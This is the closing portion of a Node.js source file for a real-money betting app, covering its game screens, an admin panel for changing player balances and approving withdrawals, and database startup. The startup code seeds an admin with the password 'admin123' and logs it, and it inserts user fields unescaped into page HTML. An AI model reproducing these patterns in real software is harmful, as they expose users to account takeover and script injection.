              '<p class="text-[10px] text-amber-200/70">Step ' + state.chickenStep + ' (Multiplier: ' + (state.chickenStep === 1 ? '1.05x' : state.chickenStep === 2 ? '1.50x' : state.chickenStep === 3 ? '2.00x' : state.chickenStep === 4 ? '2.50x' : '3.00x') + ')</p>' +
            '</div>' +
            manualBetBar +
            '<button onclick="playGameAction({ step: state.chickenStep })" class="w-full max-w-xs gold-gradient text-black font-black py-3.5 rounded-xl text-md shadow-xl active:scale-95">CROSS ROAD 🐔</button>' +
          '</div>';
        } else if (state.currentGame === 'colourguess') {
          gameContent = '<div class="flex-1 flex flex-col items-center justify-center p-4 space-y-4">' +
            '<div class="glass-card p-6 rounded-3xl w-full text-center space-y-3 neon-glow">' +
              '<span class="text-xs text-amber-300 font-bold">CHOOSE YOUR LUCKY COLOUR</span>' +
              '<div class="flex justify-center gap-2 pt-2">' +
                ['White','Green','Black','Yellow','Blue'].map(c => '<button onclick="playGameAction(\\'' + c + '\\')" class="px-3 py-3 rounded-xl font-bold text-xs gold-gradient text-black">' + c + '</button>').join('') +
              '</div>' +
            '</div>' +
            manualBetBar +
          '</div>';
        } else if (state.currentGame === 'andarbahar') {
          gameContent = '<div class="flex-1 flex flex-col items-center justify-center p-4 space-y-4">' +
            '<div class="glass-card p-6 rounded-3xl w-full text-center space-y-3 neon-glow">' +
              '<div class="text-4xl">🎴</div>' +
              '<div class="text-amber-300 font-bold text-sm">Main Card: ' + state.andarCard + '</div>' +
              '<p class="text-[11px] text-amber-200/70">Predict where matching card opens</p>' +
            '</div>' +
            manualBetBar +
            '<div class="grid grid-cols-2 gap-3 w-full max-w-xs">' +
              '<button onclick="playGameAction(\\'andar\\')" class="glass-card h-16 rounded-2xl font-black text-amber-300 text-md">ANDAR</button>' +
              '<button onclick="playGameAction(\\'bahar\\')" class="glass-card h-16 rounded-2xl font-black text-amber-300 text-md">BAHAR</button>' +
            '</div>' +
          '</div>';
        } else if (state.currentGame === 'graphprediction') {
          gameContent = '<div class="flex-1 flex flex-col items-center justify-center p-4 space-y-4">' +
            '<div class="glass-card p-6 rounded-3xl w-full text-center space-y-3 neon-glow">' +
              '<div class="text-4xl">📈</div>' +
              '<div class="text-amber-300 font-bold text-sm">Graph Direction Trend</div>' +
            '</div>' +
            manualBetBar +
            '<div class="grid grid-cols-2 gap-3 w-full max-w-xs">' +
              '<button onclick="playGameAction(\\'up\\')" class="glass-card h-16 rounded-2xl font-black text-emerald-400 text-md">UP 🟢</button>' +
              '<button onclick="playGameAction(\\'down\\')" class="glass-card h-16 rounded-2xl font-black text-red-400 text-md">DOWN 🔴</button>' +
            '</div>' +
          '</div>';
        } else if (state.currentGame === 'wheelspin') {
          gameContent = '<div class="flex-1 flex flex-col items-center justify-center p-4 space-y-4">' +
            '<div class="relative w-40 h-40 rounded-full border-4 border-amber-400 flex items-center justify-center overflow-hidden glass-card neon-glow">' +
              '<div id="wheel-element" class="absolute inset-0 bg-gradient-to-r from-red-600 via-amber-500 to-purple-600 transition-transform duration-1000 flex items-center justify-center font-black text-white text-lg">🎡</div>' +
            '</div>' +
            manualBetBar +
            '<button onclick="playGameAction(\\'spin\\')" class="w-full max-w-xs gold-gradient text-black font-black py-3 rounded-xl shadow-xl">SPIN WHEEL 🎯</button>' +
          '</div>';
        }

        html = '<div class="h-full w-full flex flex-col bg-[#07090e]">' +
          '<div class="h-14 px-3 bg-[#141b2d] border-b border-amber-500/40 flex items-center justify-between">' +
            '<button onclick="state.view=\\'lobby\\'; render();" class="px-3 py-1 bg-red-950 rounded-xl text-xs font-bold text-white">Lobby</button>' +
            '<span class="font-black gold-text">' + gameObj.name + '</span>' +
            '<span class="font-mono text-sm text-green-400 font-bold">₹' + state.user.balance.toFixed(2) + '</span>' +
          '</div>' +
          gameContent +
        '</div>';
      }
      else if (state.view === 'admin') {
        html = '<div class="h-full w-full flex flex-col bg-[#07090e] p-4 overflow-y-auto space-y-4">' +
          '<div class="flex justify-between items-center border-b border-amber-500/40 pb-2">' +
            '<h2 class="font-black text-amber-300 text-lg">Admin Control Center</h2>' +
            '<button onclick="state.view=\\'login\\'; render();" class="px-3 py-1 bg-red-950 text-xs text-white rounded-lg">Logout</button>' +
          '</div>' +
          '<div class="glass-card p-4 rounded-2xl space-y-3">' +
            '<h3 class="text-xs font-bold text-amber-300">Add / Minus Player Points by Mobile</h3>' +
            '<input id="adm-mobile" type="tel" placeholder="Player Mobile Number" class="w-full p-2.5 bg-black/70 border border-amber-500/40 text-xs text-white rounded-xl">' +
            '<input id="adm-amt" type="number" placeholder="Points Amount" class="w-full p-2.5 bg-black/70 border border-amber-500/40 text-xs text-white rounded-xl">' +
            '<div class="flex gap-2">' +
              '<button onclick="adminModifyBalance(\\'add\\')" class="w-1/2 bg-emerald-600 text-white font-bold py-2.5 rounded-xl text-xs">Add Points ➕</button>' +
              '<button onclick="adminModifyBalance(\\'sub\\')" class="w-1/2 bg-red-600 text-white font-bold py-2.5 rounded-xl text-xs">Deduct Points ➖</button>' +
            '</div>' +
          '</div>' +
          '<div class="space-y-2">' +
            '<h3 class="text-xs font-bold text-amber-300">Pending Deposit & Withdrawal Requests</h3>' +
            state.adminTxns.map(t => '<div class="bg-black/70 p-3 rounded-xl border border-amber-500/30 flex justify-between items-center text-xs">' +
              '<div>' +
                '<div class="font-bold text-amber-300">' + t.name + ' (' + t.mobile + ') - ' + t.type.toUpperCase() + '</div>' +
                '<div class="text-[10px] text-amber-100/70 font-mono">₹' + t.amount + ' | Details: ' + t.details + '</div>' +
              '</div>' +
              '<div class="flex gap-1">' +
                '<button onclick="processTxn(\\'' + t._id + '\\', \\'approve\\')" class="px-2 py-1 bg-emerald-600 text-white rounded font-bold">Approve</button>' +
                '<button onclick="processTxn(\\'' + t._id + '\\', \\'reject\\')" class="px-2 py-1 bg-red-600 text-white rounded font-bold">Reject</button>' +
              '</div>' +
            '</div>').join('') +
          '</div>' +
        '</div>';
      }

      app.innerHTML = html + popupHtml;

      if(state.view === 'game') {
        if(state.currentGame === 'aviator') renderAviatorCanvas();
        if(state.currentGame === 'chickenroad') renderChickenRoadUI();
      }
    }
    render();
  </script>
</body>
</html>`);
});

const PORT = process.env.PORT || 10000;
const MONGO_URI = process.env.MONGODB_URI;

async function startServer() {
  if (!MONGO_URI) {
    console.error("CRITICAL ERROR: MONGODB_URI environment variable missing!");
    process.exit(1);
  }
  try {
    await mongoose.connect(MONGO_URI);
    console.log("MongoDB Atlas Connected Successfully");
    
    const admin = await User.findOne({ mobile: '9005041462' });
    if (!admin) {
      const hashedPassword = await bcrypt.hash('admin123', 10);
      await User.create({ name: 'Admin Boss', mobile: '9005041462', password: hashedPassword, role: 'admin', balance: 999999 });
      console.log("Admin account created: 9005041462 / admin123");
    }

    server.listen(PORT, () => console.log('Server running on port ' + PORT));
  } catch (err) {
    console.error("Database connection failed:", err.message);
    process.exit(1);
  }
}
startServer();
